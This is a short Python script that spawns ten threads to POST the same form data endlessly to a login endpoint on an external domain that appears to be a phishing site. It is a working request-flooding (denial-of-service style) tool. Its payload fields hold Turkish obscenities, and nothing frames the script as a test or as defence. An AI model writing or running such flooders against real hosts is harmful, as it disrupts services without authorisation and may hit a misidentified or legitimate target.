import requests
import threading

# Define the URL for the AJAX login
url = 'https://tr-sikayet.merkezleri-tr.sbs/login-912/giris/ajaxlogin.php'

# Define the payload with the login details
payload = {
    'kertenkele': 'allahini',
    'TOKEN': 'sikiyom'
}

# Define headers if needed
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Function to send a request without waiting for a response
def send_request():
    while True:
        try:
            requests.post(url, data=payload, headers=headers)
            print("Request sent")
        except Exception as e:
            print(f"Error occurred: {e}")


# def randomNameGenerator():
#     kelimeler = 
# Start multiple threads to continuously send requests
threads = []
for i in range(10):  # You can increase or decrease the number of threads
    thread = threading.Thread(target=send_request)
    thread.daemon = True  # Daemonize thread to ensure it exits when the main program does
    threads.append(thread)
    thread.start()


# Keep the main program running to allow threads to continue executing
while True:
    pass

